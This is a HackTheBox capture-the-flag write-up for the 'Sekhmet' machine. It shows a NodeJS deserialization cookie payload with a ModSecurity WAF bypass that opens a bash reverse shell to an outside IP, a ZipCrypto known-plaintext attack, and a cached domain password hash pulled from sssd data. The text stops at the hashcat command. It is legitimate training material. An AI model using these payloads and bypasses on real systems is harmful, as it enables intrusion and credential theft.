---
title: HTB: Sekhmet
url: https://0xdf.gitlab.io/2023/04/01/htb-sekhmet.html
date: 2023-04-01T13:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: hackthebox, htb-sekhmet, ctf, nmap, ffuf, subdomain, nodejs, express, feroxbuster, deserialization, json-deserialization, modsecurity, waf, filter, bypass, sssd, kerberos, zipcrypto, bkcrack, known-plaintext, crypto, hashcat, kinit, klist, ksu, tunnel, smbclient, proxychains, command-injection, watch, tmux, ldapsearch, ldap, password-spray, kerbrute, winrm, evil-winrm, dpapi, mimikatz, pypykatz, edge-saved-passwords, applocker, applocker-bypass, sharp-chromium, sharp-collection, htb-hathor, htb-anubis, htb-celestial, htb-nodeblog, htb-ransom, htb-access, osep-like, cpts-like
---

![Sekhmet](/img/sekhmet-cover.png)

Sekhmet has Windows and Linux exploitation, and a lot of Kerberos. I’ll start exploiting a ExpressJS website vulnable to a JSON deserialization attack. To get execution, I’ll have to bypass a ModSecurity web application firewall. This lands me in a Linux VM. In the VM, I’ll find a backup archive and break the encryption using a known plaintext attack on ZipCrypto to get another user’s domain hash. On cracking that, I’m able to get root on the VM. As the domain user, I’ll access a share, and figure that there’s a text file being updated based on the mobile attribute for four users in the AD environment. There’s a command injection in the script that’s updating, and I’ll use that to get a hash for the user running the script. After password spraying that password to find another user, I’ll get access to the host and find DPAPI protected creds in the user’s Edge instance. On cracking those, I get domain admin credentials.

## Box Info

| Name | [Sekhmet](https://hackthebox.com/machines/sekhmet)  [Sekhmet](https://hackthebox.com/machines/sekhmet) [Play on HackTheBox](https://hackthebox.com/machines/sekhmet) |
| --- | --- |
| Release Date | [10 Sep 2022](https://twitter.com/hackthebox_eu/status/1567543280233054211) |
| Retire Date | 01 Apr 2023 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Sekhmet |
| Radar Graph | Radar chart for Sekhmet |
| First Blood User | 04:31:28[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 21:37:04[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [4ndr34z 4ndr34z](https://app.hackthebox.com/users/55079) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.179
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-24 16:47 EDT
Nmap scan report for 10.10.11.179
Host is up (0.086s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.58 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.179
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-28 12:35 EDT
Nmap scan report for 10.10.11.179
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.07 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 11 bullseye. This is interesting given that HTB shows Sekhmet as a Windows box. Probably VM or container.

### Subdomain Brute Force

Visiting the site returns a redirect to `www.windcorp.htb`. Given the use of domains, I’ll use `ffuf` to fuzz for any other subdomains that respond differently. I use `-ac` to filter automatically, and `-mc all` to make sure I get any HTTP response codes:

```

oxdf@hacky$ ffuf -u http://10.10.11.179 -H "Host: FUZZ.windcorp.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.179
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.windcorp.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

[Status: 403, Size: 2436, Words: 234, Lines: 44, Duration: 110ms]
    * FUZZ: portal

:: Progress: [19966/19966] :: Job [1/1] :: 278 req/sec :: Duration: [0:01:01] :: Errors: 0 ::

```

It finds `portal.windcorp.htb` immediately. I’ll update my `/etc/hosts` file to include:

```
10.10.11.179 www.windcorp.htb windcorp.htb portal.windcorp.htb

```

I’ll also make sure to comment out any lines from [Hathor](/2022/11/19/htb-hathor.html) and [Anubis](/2022/01/29/htb-anubis.html), both of which used `windcorp.htb`.

### www.windcorp.htb - TCP 80

#### Site

The site is for a website creation / graphic design company:

[![image-20230328124223097](/img/image-20230328124223097.png)](/img/image-20230328124223097.png)

[*Click for full image*](/img/image-20230328124223097.png)

There’s an email address right at the top, `contact@windcorp.htb`. There are some names of employees, but nothing that looks like a username.

#### Tech Stack

The HTTP headers show NGINX, but not much else:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 28 Mar 2023 16:41:41 GMT
Content-Type: text/html
Last-Modified: Thu, 18 Aug 2022 15:09:09 GMT
Connection: close
ETag: W/"62fe5615-8664"
Content-Length: 34404

```

The 404 page is the default NGINX 404:

![image-20230328124623085](/img/image-20230328124623085.png)

This could be just NGINX hosting a static site.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://www.windcorp.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://www.windcorp.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l        -w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l        9w      153c http://www.windcorp.htb/.inc
301      GET        7l       11w      169c http://www.windcorp.htb/assets => http://www.windcorp.htb/assets/
200      GET      112l      805w    65527c http://www.windcorp.htb/assets/img/team/team-3.jpg
200      GET       13l      164w    15563c http://www.windcorp.htb/assets/vendor/swiper/swiper-bundle.min.css
403      GET        7l        9w      153c http://www.windcorp.htb/.axd
200      GET      359l     1883w   179493c http://www.windcorp.htb/assets/img/about-list-img.jpg
200      GET      747l     2343w    34404c http://www.windcorp.htb/
200      GET        1l      133w    63781c http://www.windcorp.htb/assets/vendor/boxicons/css/boxicons.min.css
301      GET        7l       11w      169c http://www.windcorp.htb/assets/css => http://www.windcorp.htb/assets/css/
301      GET        7l       11w      169c http://www.windcorp.htb/assets/js => http://www.windcorp.htb/assets/js/
403      GET        7l        9w      153c http://www.windcorp.htb/assets/img/
...[snip]...

```

It returns a lot! I’ll let it run in the background, but it also makes the site really slow, so I’ll eventually conclude that there’s nothing really interesting here and kill it. A bunch of the identified information is 403s on files in `/assets`, which isn’t interesting.

### portal.windcorp.htb - TCP 80

#### Site

The site presents a login page:

![image-20230328125744766](/img/image-20230328125744766.png)

While just trying creds to see what the request looks like, I tried admin / admin and it worked! The next page doesn’t offer much:

![image-20230328130020128](/img/image-20230328130020128.png)

The “About” link goes to `/about` but nothing interesting:

![image-20230328130050156](/img/image-20230328130050156.png)

#### Tech Stack

The HTTP response headers on portal show that it’s Express:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 28 Mar 2023 17:17:53 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/"42a-ceoj/qzu7pE8a4/5MOc2Roj9g0U"
Content-Length: 1066

```

Visiting any url path on this host seems to return the login page as a 200 OK (no redirect). That’s a bit odd, and will make brute forcing paths with something like `feroxbuster` a bit odd (I turn out not to need this).

When I log in, the response sets a cookie:

```

HTTP/1.1 302 Found
Server: nginx/1.18.0
Date: Tue, 28 Mar 2023 17:19:37 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 46
Connection: close
X-Powered-By: Express
Set-Cookie: profile=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2ODAwMjM5Nzc1NzF9; Max-Age=604800; HttpOnly
Location: /
Vary: Accept

```

## Shell as webster on webserver

### Cookie Analysis

The cookie is base64 data:

```

oxdf@hacky$ echo "eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2ODAwMjM5Nzc1NzF9" | base64 -d
{"username":"admin","admin":"1","logon":1680023977571}

```

I can edit the cookie to change the username or admin status, but there’s not much point, as I’m already admin with admin true.

### Deserialization Attack

#### Background

[This post](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) does a nice overview of how to abuse deserialization in NodeJS / Express. I’ve actually cited this exactly post twice before, in [Celestial](/2018/08/25/htb-celestial.html#deserialization-attack) and [Nodeblog](/2022/01/10/htb-nodeblog.html#exploit-poc). The `unserialize` function in NodeJS is not meant to accept user-controlled data, and can be exploited to get code execution. The post author generates this example payload:

```

{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}

```

#### Initial Attempt

I’ll modify that payload to ping my server:

```

{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ping -c 1 10.10.14.6',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}

```

Base64-encoding gives this, which I’ll set as my cookie:

```

eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7XG4gXHQgcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3BpbmcgLWMgMSAxMC4xMC4xNC42JywKZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSgpIn0=

```

I’ll set that as my cookie in Firefox with the dev tools, and refresh the page. I don’t get pings, and the page shows I’ve been blocked by ModSecurity:

![image-20230328133020564](/img/image-20230328133020564.png)

The post shows a way to encode a reverse shell as a series of int that get passed to `eval(String.fromCharCode())`, but this is blocked as well.

### WAF

#### Enumeration

I want to figure out what’s getting blocked by the web application firewall (WAF). I’ll start removing parts of the (pre-base64-encoded cookie) and sending to see where it stops returning 403 Forbidden. `{"rce":"_$$ND_FUNC$$_` still returns 403 Forbidden, but `{"rce":"_$$ND_FUNC$$` returns a 500 Internal Server Error. The error isn’t surprising, as the malformed cookie will crash things. Still, it isn’t being flagged by the WAF

#### Bypass / RCE

There are many ways to bypass WAFs. One thing to try is different encodings. One that works here is encoding some bytes in unicode. Replacing one of the `$` with `\u0024` makes:

```

eyJyY2UiOiJfJCRORF9GVU5DJFx1MDAyNF8=

```

This is returns a 500 error! That’s bypassing the WAF (though it’s not clear yet that the server handles it correctly).

I’ll start rebuilding the cookie a bit at a time, and when I get up to this, it triggers the WAF again:

```

{"rce":"_$$ND_FUNC$\u0024_function (){

```

Encoding the `{` as `\u007b`:

```

{"rce":"_$$ND_FUNC\u0024$_function() \u007brequire('child_process').exec('ping -c 1 10.10.14.6', function(error,stdout,stderr) {console.log(stdout) });\n}()"}

```

Encoding this and sending it doesn’t return 500, but 200, with an ICMP echo request at my listening `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:58:58.162307 IP 10.10.11.179 > 10.10.14.6: ICMP echo request, id 1000, seq 1, length 64
13:58:58.162321 IP 10.10.14.6 > 10.10.11.179: ICMP echo reply, id 1000, seq 1, length 64

```

That’s RCE!

#### ModSecurity Aside

The rule that is likely blocking these request is one of the core rules, found [here](https://github.com/coreruleset/coreruleset/blob/v4.0/dev/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf). The comments specifically call out these strings as one’s they are looking for:

> ```

> # Some generic snippets used:
> # - function() {
> # - new Function(
> # - eval(
> # - String.fromCharCode(
>
> ```

The regex on line 52 also includes something for `_$$ND_FUNC$$_`:

![image-20230330144535190](/img/image-20230330144535190.png)

This rule has a series of transforms to check the data on line 57:

```

t:none,t:urlDecodeUni,t:jsDecode,t:removeWhitespace,t:base64Decode,\

```

This one include `urlDecodeUni`, but the one on Sekhmet is an older version that doesn’t.

#### Shell

I’ll replace the `ping` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

{"rce":"_$$ND_FUNC\u0024$_function() \u007brequire('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"', function(error,stdout,stderr) {console.log(stdout) });\n}()"}

```

On encoding, putting into Repeater as the cookie, and submitting, a shell connects to my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.179 59522
bash: cannot set terminal process group (475): Inappropriate ioctl for device
bash: no job control in this shell
webster@webserver:/$ 

```

I’ll do a [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

webster@webserver:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
webster@webserver:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
webster@webserver:/$ 

```

## Shell as root on webserver

### Enumeration

#### Home Directories

The only home directory on this Linux box (webserver) is webster, and it has a single backup file:

```

webster@webserver:~$ ls
backup.zip

```

I’ll exfil that to my host for further analysis (making sure to check the hashes are the same).

#### Process List

Looking at the running processes, the machine is running `sssd`:

```

webster@webserver:~$ ps auxww | grep sss
root         273  0.0  2.5  97200 23600 ?        Ss   Mar13   0:03 /usr/sbin/sssd -i --logger=files
root         381  0.0  5.3 111912 49944 ?        S    Mar13   0:17 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root         382  0.0  2.3  85160 22308 ?        S    Mar13   0:21 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
root        8659  0.0  3.0 117096 28376 ?        S    Mar20   0:21 /usr/libexec/sssd/sssd_be --domain windcorp.htb --uid 0 --gid 0 --logger=files

```

#### Active Directory

[sssd](https://sssd.io/) is an open source client for connecting a Linux machine into Active Directory. `sssd` data are stored in `/var/lib/sss`, but I can’t access anything valuable as webster:

```

webster@webserver:/var/lib/sss$ ls
db  deskprofile  gpo_cache  keytabs  mc  pipes  pubconf  secrets
webster@webserver:/var/lib/sss$ ls secrets/
ls: cannot open directory 'secrets/': Permission denied
webster@webserver:/var/lib/sss$ ls db/
ls: cannot open directory 'db/': Permission denied

```

There’s also config data in `/etc/sssd`, but I can’t access that either:

```

webster@webserver:~$ ls /etc/sssd/ 
ls: cannot open directory '/etc/sssd/': Permission denied

```

The `/etc/krb5.conf` file does show information about the domain:

```

[libdefaults]
        default_realm = WINDCORP.HTB

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
...[snip]...
        fcc-mit-ticketflags = true

[realms]
        WINDCORP.HTB = {
                kdc = hope.windcorp.htb
                admin_server = hope.windcorp.com
                default_domain = windcorp.htb
        }

[domain_realm]
        .windcorp.htb = WINDCORP.HTB
        windcorp.com = WINDCORP.HTB

[appdefaults]
        forwardable = true
                pam = {
                        WINDCORP.HTB = {
                                ignore_k5login = false
                                }
                }

```

The DC is named `hope.windcorp.htb`.

#### Network

If it’s not clear from the fact that the shell is in a Linux VM on a Windows target, the IP address of 192.168.0.100 shows that I’m in a VM or container:

```

webster@webserver:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:10:93:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.100/24 brd 192.168.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fe10:9300/64 scope link 
       valid_lft forever preferred_lft forever

```

I can ping the DC at .2:

```

webster@webserver:~$ ping hope.windcorp.htb
PING hope.windcorp.htb (192.168.0.2) 56(84) bytes of data.
64 bytes from hope.windcorp.htb (192.168.0.2): icmp_seq=1 ttl=128 time=0.368 ms
64 bytes from hope.windcorp.htb (192.168.0.2): icmp_seq=2 ttl=128 time=0.359 ms
^C
--- hope.windcorp.htb ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 0.359/0.363/0.368/0.004 ms

```

Nothing else in the network responds to a ping sweep:

```

webster@webserver:~$ for i in {1..254}; do (ping -c 1 192.168.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done
64 bytes from 192.168.0.2: icmp_seq=1 ttl=128 time=1.00 ms
64 bytes from 192.168.0.100: icmp_seq=1 ttl=64 time=0.049 ms

```

I can explore connections with the DC, but first I’m going to work on this zip backup.

### Access Zip

#### Fails

Trying to unzip this shows it needs a password:

```

oxdf@hacky$ 7z x backup.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,6 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 72984 bytes (72 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 72984

Enter password (will not be echoed):

```

I can try to brute force the password, but without luck.

#### Identify Encryption Method

`7z l -slt` will show metadata about each file / folder in the archive. On this one, it shows all of the files are encrypted with ZipCrypto:

```

oxdf@hacky$ 7z l -slt backup.zip 
                                            
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21                      
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,6 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F10),ASM,AES-NI)

Scanning the drive for archives:            
1 file, 72984 bytes (72 KiB)

Listing archive: backup.zip
--                            
Path = backup.zip                           
Type = zip
Physical Size = 72984                       
----------                                  
Path = etc/passwd                        
Folder = -                                  
Size = 1509                              
Packed Size = 554                           
Modified = 2022-04-30 11:27:46
Created =                                   
Accessed =                           
Attributes = _ -rw-r--r--                   
Encrypted = +                   
Comment =                                   
CRC = D00EEE74                
Method = ZipCrypto Deflate                  
Host OS = Unix
Version = 20                                
Volume Index = 0
...[snip]...
Path = etc/sssd/sssd.conf
Folder = -
Size = 411
Packed Size = 278                           
Modified = 2022-04-29 08:39:18
Created =
Accessed =                                  
Attributes = _ -rw-------                   
Encrypted = +
Comment =
CRC = A46408D2
Method = ZipCrypto Deflate                  
Host OS = Unix                
Version = 20                                
Volume Index = 0 
...[snip]...

```

#### Exploit ZipCrypto

There’s a known plaintext attack on ZipCrypto. I showed this before on [Ransom](/2022/03/15/htb-ransom.html#decrypt-zip).

I need to know plaintext of one of the files in the archive. Luckily for me, `/etc/passwd` is in the archive. Also, it gives the CRC32 for the file above as “D00EEE74”. I can verify this matches the current `passwd` file using using Python3:

```

webster@webserver:/$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>> with open('/etc/passwd', 'rb') as f:
...     data = f.read()
... 
>>> hex(binascii.crc32(data) & 0xffffffff)
'0xd00eee74'

```

It’s match. I’ll exfil a copy of `/etc/passwd` to my host.

To attack this, I’ll use `bkcrack` (from [here](https://github.com/kimci86/bkcrack)). I’ll need an unencrypted zip with `passwd` in it:

```

oxdf@hacky$ zip plain.zip passwd 
  adding: passwd (deflated 64%)

```

I’ll run `bkcrack` giving it:
- `-C backup.zip` - the encrypted zip
- `-c etc/passwd` - the name of the known file in the encrypted zip
- `-P plain.zip` - the plaintext zip
- `-p passwd` - the name of the known file in the plain zip.

It finds keys:

```

oxdf@hacky$ /opt/bkcrack-1.5.0-Linux/bkcrack -C backup.zip -c etc/passwd -P plain.zip -p passwd
bkcrack 1.5.0 - 2022-07-07
[15:58:59] Z reduction using 535 bytes of known plaintext
100.0 % (535 / 535)
[15:59:00] Attack on 14541 Z values at index 9
Keys: d6829d8d 8514ff97 afc3f825
91.3 % (13274 / 14541)
[15:59:10] Keys
d6829d8d 8514ff97 afc3f825

```

To use the keys, I’ll call `bkcrack` again, this time with:
- `-C backup.zip` - the encrypted archive
- `-k [keys]` - the keys
- `-U [output.zip]` - the output file that will have all the files in it
- `[password]` - the known password for that output file.

This one runs quickly:

```

oxdf@hacky$ /opt/bkcrack-1.5.0-Linux/bkcrack -C backup.zip -k d6829d8d 8514ff97 afc3f825 -U backup-pass.zip pass
bkcrack 1.5.0 - 2022-07-07
[16:02:24] Writing unlocked archive backup-pass.zip with password "pass"
100.0 % (21 / 21)
Wrote unlocked archive.

```

This creates a new zip with the know password. I can decrypt:

```

oxdf@hacky$ 7z x backup-pass.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,6 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 72984 bytes (72 KiB)

Extracting archive: backup-pass.zip
--
Path = backup-pass.zip
Type = zip
Physical Size = 72984

Enter password (will not be echoed):
Everything is Ok 

Folders: 19
Files: 21
Size:       38385303
Compressed: 72984
oxdf@hacky$ ls
backup-pass.zip  etc  var

```

### Get Ray.Duncan Password

#### Get Hash from LDB

In `/var/lib/sss/db` there’s a `.ldb` file that holds all the AD information, `cache_windcorp.htb.ldb`. The file is a TDB file:

```

oxdf@hacky$ file cache_windcorp.htb.ldb 
cache_windcorp.htb.ldb: TDB database version 6, little-endian hash size 10000 bytes

```

`strings` can get the info I need from this file, but `tdbdump` will do it a bit cleaner (part of the `samba` suite, `apt install samba`):

```

oxdf@hacky$ tdbdump cache_windcorp.htb.ldb
...[snip]...
{                                                                                                                                                                                  key(66) = "DN=NAME=Ray.Duncan@windcorp.htb,CN=USERS,CN=WINDCORP.HTB,CN=SYSDB\00"                                                                                                   data(2448) = "g\19\01&!\00\00\00name=Ray.Duncan@windcorp.htb,cn=users,cn=windcorp.htb,cn=sysdb\00createTimestamp\00\01\00\00\00\0A\00\00\001659007013\00fullName\00\01\00\00\00\0A\
00\00\00Ray Duncan\00gecos\00\01\00\00\00\0A\00\00\00Ray Duncan\00gidNumber\00\01\00\00\00\0A\00\00\001069000513\00name\00\01\00\00\00\17\00\00\00Ray.Duncan@windcorp.htb\00objectC
ategory\00\01\00\00\00\04\00\00\00user\00uidNumber\00\01\00\00\00\0A\00\00\001069003229\00objectSIDString\00\01\00\00\00.\00\00\00S-1-5-21-1844305427-4058123335-2739572863-3229\00
uniqueID\00\01\00\00\00$\00\00\005b7d02b0-b9d3-4bbb-9430-1687f785b601\00originalDN\00\01\00\00\00/\00\00\00CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb\00originalMemberOf\00\01
\00\00\00+\00\00\00CN=Development,OU=Groups,DC=windcorp,DC=htb\00originalModifyTimestamp\00\01\00\00\00\11\00\00\0020220728105342.0Z\00entryUSN\00\01\00\00\00\06\00\00\00258212\00
userPrincipalName\00\01\00\00\00\17\00\00\00Ray.Duncan@WINDCORP.COM\00adAccountExpires\00\01\00\00\00\13\00\00\009223372036854775807\00adUserAccountControl\00\01\00\00\00\03\00\00
\00512\00nameAlias\00\01\00\00\00\17\00\00\00ray.duncan@windcorp.htb\00isPosix\00\01\00\00\00\04\00\00\00TRUE\00lastUpdate\00\01\00\00\00\0A\00\00\001659007013\00dataExpireTimesta
mp\00\01\00\00\00\0A\00\00\001659012413\00memberof\00\02\00\00\00c\00\00\00name=S-1-5-21-1844305427-4058123335-2739572863-3601@windcorp.htb,cn=groups,cn=windcorp.htb,cn=sysdb\00b\00\00\00name=S-1-5-21-1844305427-4058123335-2739572863-513@windcorp.htb,cn=groups,cn=windcorp.htb,cn=sysdb\00initgrExpireTimestamp\00\01\00\00\00\0A\00\00\001659012797\00canonical
UserPrincipalName\00\01\00\00\00\17\00\00\00Ray.Duncan@WINDCORP.HTB\00ccacheFile\00\01\00\00\00\22\00\00\00FILE:/tmp/krb5cc_1069003229_bA74OK\00cachedPassword\00\01\00\00\00j\00\0
0\00$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81\00cachedPasswordType\00\01\00\00\00\01\00\00\001\00lastCachedPasswor
dChange\00\01\00\00\00\0A\00\00\001659007462\00failedLoginAttempts\00\01\00\00\00\01\00\00\000\00lastOnlineAuth\00\01\00\00\00\0A\00\00\001659007462\00lastOnlineAuthWithCurrentTok
en\00\01\00\00\00\0A\00\00\001659007462\00lastLogin\00\01\00\00\00\0A\00\00\001659007462\00pacBlob\00\01\00\00\00\18\03\00\00\06\00\00\00\00\00\00\00\01\00\00\00\C8\01\00\00h\00\00\00\00\00\00\00\0A\00\00\00\1E\00\00\000\02\00\00\00\00\00\00\0C\00\00\00\98\00\00\00P\02\00\00\00\00\00\00\06\00\00\00\10\00\00\00\E8\02\00\00\00\00\00\00\07\00\00\00\10\00\00\0
0\F8\02\00\00\00\00\00\00\10\00\00\00\10\00\00\00\08\03\00\00\00\00\00\00\01\10\08\00\CC\CC\CC\CC\B8\01\00\00\00\00\00\00\00\00\02\00\BC;9\89s\A2\D8\01\FF\FF\FF\FF\FF\FF\FF\7F\FF\
FF\FF\FF\FF\FF\FF\7F\82\C5<Mp\A2\D8\01\82\85\A6w9\A3\D8\01\FF\FF\FF\FF\FF\FF\FF\7F\14\00\14\00\04\00\02\00\00\00\00\00\08\00\02\00\00\00\00\00\0C\00\02\00\00\00\00\00\10\00\02\00\
00\00\00\00\14\00\02\00\00\00\00\00\18\00\02\00Y\00\00\00\9D\0C\00\00\01\02\00\00\02\00\00\00\1C\00\02\00 \00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\0A\00 \00
\02\00\10\00\12\00$\00\02\00(\00\02\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00,\00\02\00\00\00\00\00\00\00\00\00\00\00\00\00\0A\00\00\00\00\00\00\00\0A\00\00\00R\00a\00y\00.\00D\00u\00n\00c\00a\00n\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00
\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\02\00\00\00\11\0E\00\00\07\00\00\00\01\02\00\00\07\00\00\00\05\0
0\00\00\00\00\00\00\04\00\00\00H\00O\00P\00E\00\09\00\00\00\00\00\00\00\08\00\00\00W\00I\00N\00D\00C\00O\00R\00P\00\04\00\00\00\01\04\00\00\00\00\00\05\15\00\00\00\13\DE\EDmG\0C\E
2\F1\7F\90J\A3\01\00\00\000\00\02\00\07\00\00\00\01\00\00\00\01\01\00\00\00\00\00\12\01\00\00\00\00\00\00\00\80\13\F3\88s\A2\D8\01\14\00r\00a\00y\00.\00d\00u\00n\00c\00a\00n\00\00
\00.\00\18\00\18\00H\00\02\00\00\00\14\00`\00\1C\00x\00\00\00\00\00R\00a\00y\00.\00D\00u\00n\00c\00a\00n\00@\00w\00i\00n\00d\00c\00o\00r\00p\00.\00c\00o\00m\00\00\00W\00I\00N\00D\00C\00O\00R\00P\00.\00H\00T\00B\00R\00a\00y\00.\00D\00u\00n\00c\00a\00n\00\00\00\00\00\01\05\00\00\00\00\00\05\15\00\00\00\13\DE\EDmG\0C\E2\F1\7F\90J\A3\9D\0C\00\00\00\00\00\00\10\00\00\00=\F3<B\A5Y\DC\1E\D8e\05\E3\10\00\00\00(\C2\DE\11\14`\97`\C1o\D2&\10\00\00\00\D0\DF\9B\D3\CA\A5j\ECs\98\7F?\00pacBlobExpireTimestamp\00\01\00\00\00\0A\00\00\001659008583\00"
} 
...[snip]...

```

The blob on Ray.Duncan is the largest in the dump, and it contains a hash:

[![image-20230328162657741](/img/image-20230328162657741.png)*Click for full size image*](/img/image-20230328162657741.png)

#### Hashcat

I’ll save that in a file and pass it to `hashcat`:

```

$ hashcat ray.duncan.hash /usr/share/wordlists/rockyou.txt 
